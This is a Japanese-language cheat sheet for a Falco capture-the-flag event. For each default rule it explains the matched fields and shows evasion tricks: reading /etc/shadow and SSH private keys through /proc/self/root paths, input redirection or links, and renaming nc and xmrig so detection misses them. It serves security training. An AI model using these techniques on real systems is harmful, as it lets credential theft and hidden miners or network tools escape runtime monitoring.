# Falco CTF リファレンスカード

ワークスペースで詰まったときに横目で見るためのチートシート。
事前にざっと眺めておくと当日が楽になります。

---

## 1. 自分が誰か / どこにいるか

```bash
echo $FALCO_CTF_USER         # ユーザ名 (= ctf-<username> namespace の username)
echo $FALCO_CTF_CHALLENGE    # 現在取り組み中の challenge id
hostname                     # = pod 名 (workspace)
cat /etc/os-release          # alpine 3.20 ベース
```

---

## 2. Falco が観測しているフィールド (主要)

| フィールド | 意味 | どこから来るか |
|---|---|---|
| `fd.name` | open された fd の path | `openat(2)` 引数 |
| `fd.directory` | 上の dir 部分 | 〃 |
| `proc.name` | プロセスの comm (basename of exe) | `/proc/<pid>/comm` |
| `proc.pname` | **親**プロセスの comm | 〃 (parent) |
| `proc.cmdline` | コマンドライン文字列全体 | `/proc/<pid>/cmdline` |
| `proc.exe` | 実行ファイルのフルパス | kernel exec 情報 |
| `proc.aname[N]` | N 世代上の祖先 comm | 〃 |
| `container.image.repository` | コンテナイメージ名 | CRI socket |
| `k8s.ns.name` | Pod の Namespace | K8s API watcher |
| `k8s.pod.name` | Pod 名 | 〃 |

**重要**: ルールは syscall 単位で評価されますが、判定条件は **ほぼ
すべて文字列マッチ**です。同じ inode を別 path で開けば検知ロジック
からは別物に見えます。

---

## 3. このイベントで出題される Falco ルール

### 3.1 `Read sensitive file untrusted`

| 項目 | 内容 |
|---|---|
| 何を見るか | `fd.name` が `/etc/shadow` / `/etc/sudoers` / `/etc/pam.d/*` 等の sensitive_files に一致 |
| 発火条件 (大意) | `open_read` syscall で対象パスを開いた + 開いたプロセスが trusted リスト外 |
| 上記出題 | 01 (発火), 02 (回避) |
| 回避の発想 | path 文字列マッチ → 同じファイルに別の path で到達できれば抜ける |

主な回避路 (例):
```bash
cat /etc/shadow                  # ← 発火する
cat /proc/self/root/etc/shadow   # ← 同じ inode、別 path。発火しない
cat /proc/$$/root/etc/shadow     # 〃
ln -s /etc/shadow /tmp/x; cat /tmp/x   # symlink 経由 (fd.name 解決は kernel 次第)
```

### 3.2 `Search Private Keys or Passwords`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.cmdline` に `id_rsa` / `id_dsa` / `BEGIN.*PRIVATE KEY` / `AWS_SECRET` 等 |
| 発火条件 | 上記パターンを含むコマンドが exec された (結果は問わない) |
| 上記出題 | 04 (発火), 05 (回避), 10 (回避) |
| 回避の発想 | cmdline に keyword を出さない: 入力リダイレクト `<` / 環境変数経由 / 文字列分割 |

例:
```bash
find /tmp -iname id_rsa                 # ← 発火 (cmdline に "id_rsa")
cat /root/.ssh/id_rsa                   # ← 発火 (同上)

# 回避: 入力リダイレクトで cmdline に path を出さない
cat < /root/.ssh/id_rsa                 # ← cmdline = "cat" のみ → 発火しない
xxd < /root/.ssh/id_rsa | tail
```

### 3.3 `Run shell untrusted`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.pname` が `shell_mgmt_binaries` (`httpd`/`nginx`/`apache2`/`postgres` 等) |
| 発火条件 | shell (bash/sh/zsh) が起動 + 親 comm が上記リスト |
| 上記出題 | 06 (発火), 10 (回避) |
| 回避の発想 | `proc.comm` は kernel が exec 時に basename から決める → 別名で動かす |

例:
```bash
/opt/ctf/httpd                    # ← 親 comm = "httpd" → 発火
sh /opt/ctf/httpd                 # ← 親 comm = "sh"   → 発火しない
cat /opt/ctf/httpd | sh           # ← 親 comm = "cat" "sh" → 発火しない
```

### 3.4 `Modify binary dirs`

| 項目 | 内容 |
|---|---|
| 何を見るか | `fd.directory` が `/bin /sbin /usr/bin /usr/sbin` |
| 発火条件 | 上記 dir に書き込みオープン |
| 上記出題 | 01 (発火), 10 (回避) |
| 回避の発想 | `/tmp` `/var/tmp` `/dev/shm` `/usr/local/bin` 等の対象外 dir を使う |

例:
```bash
touch /usr/bin/x          # ← 発火
touch /usr/local/bin/x    # ← 発火しない (が 3.5 で発火する)
touch /tmp/x              # ← どちらも発火しない
```

### 3.5 `Write below binary dir`

| 項目 | 内容 |
|---|---|
| 何を見るか | `fd.directory` が **bin_dirs + /usr/local/bin /usr/local/sbin /opt/bin** 等の PATH 系拡張 dir |
| 発火条件 | 上記以下に書き込みオープン |
| 上記出題 | 07 (発火), 10 (回避) |
| 回避の発想 | PATH 系 dir 以外に置く (`/tmp` 等)。PATH を自分の dir で上書き |

3.4 と 3.5 はスコープが**重なる** (`/usr/bin` 等は両方発火)。

### 3.6 `Launch Suspicious Network Tool in Container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.name in (suspicious_network_tools)` (`nc`/`ncat`/`socat`/`nmap`/`tcpdump`/`tshark` 等) |
| 発火条件 | 上記ツール exec (実通信成否は問わない) |
| 上記出題 | 08 (発火), 10 (回避) |
| 回避の発想 | basename 判定 — 別名にコピーすれば exec しても発火しない |

注: `curl` / `wget` は対象**外**。普通の HTTP クライアントなので
suspicious_network_tools リストに入らない。

例:
```bash
nc -zv 8.8.8.8 53                # ← 発火
cp /bin/nc /tmp/foo && /tmp/foo  # ← proc.name = "foo" → 発火しない
```

### 3.7 Crypto miner 検知ルール (例 `Detect crypto miners using the Stratum protocol`)

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.name` が既知の miner (`xmrig`/`minerd`/`cpuminer`) **または** outbound に `stratum+tcp://` |
| 発火条件 | 上のいずれか |
| 上記出題 | 09 (発火) |
| 回避の発想 | やはり basename — `cp xmrig /tmp/sysd && /tmp/sysd` |

CTF 環境では outbound が NetworkPolicy で block されるので、stratum
protocol 系は発火させづらい。proc.name 系だけで実用十分。

---

## 4. 「同じ inode に別 path で到達」する代表テクニック

| 方法 | 例 | 性質 |
|---|---|---|
| `/proc/<pid>/root` | `/proc/self/root/etc/shadow` | プロセスの mount namespace の root を指す symlink。**最も汎用** |
| Symbolic link | `ln -s /etc/shadow /tmp/x` | 多くの Falco ルールは fd.name に **解決後** の path を入れるので無効な場合あり |
| Hard link | `ln /etc/shadow /tmp/x` | `/etc/shadow` への write 権が要る (このコンテナでは root だが他環境では NG) |
| Bind mount | `mount --bind /etc/shadow /tmp/x; cat /tmp/x` | `mount` 権限が要る (このコンテナでは可能なはず) |
| Tool 経由 | `busybox cat /etc/shadow` | `proc.name` が変わるが `fd.name` は変わらず — 検知に影響しないことが多い |

---

## 5. コマンド ↔ syscall 早見

| やりたいこと | 安全 (発火しない) | 危険 (発火する) |
|---|---|---|
| ファイルの中身を見る | `xxd /proc/self/root/<path>` | `cat <sensitive-path>` |
| 鍵ファイルを探す | (検知される語を含めない) | `find / -iname id_rsa` |
| shell を起こす | `bash -c 'echo hi'` (親が shell なら可) | 親 comm が httpd/nginx 等 |
| シェル探索 | `whatis cat` (alpine では `man-pages` パッケージ要) | — |

---

## 6. 行き詰まったときの定石

1. **welcome.txt を再読** — チャレンジ固有のヒントが書いてある (`cat /opt/ctf/fixtures/welcome.txt`)
2. **Falco ルール本体を読む** — 何を見ているかを直接確認
   - 参考: https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml
3. **`/proc/self/<...>`** に逃げる — `/proc/<pid>/root` / `/proc/<pid>/cmdline` 等
4. **シェル組み込み (builtin) で代用** — `cat foo.txt` → `printf '%s\n' "$(< foo.txt)"` 等
5. **fixtures 内のスクリプトを覗く** — `cat /opt/ctf/fixtures/submit.sh` 等で
   提出ロジックの中身がわかる

---

## 7. このリファレンスの場所

- 事前配布版: `falco-ctf-app/challenges/REFERENCE.md` (本ファイル)
- ワークスペース内: 本イベントの版数では未バンドル (`PARTICIPANT-HANDBOOK.md`
  と一緒に運営から配布されているはず)

質問・修正提案は運営まで。
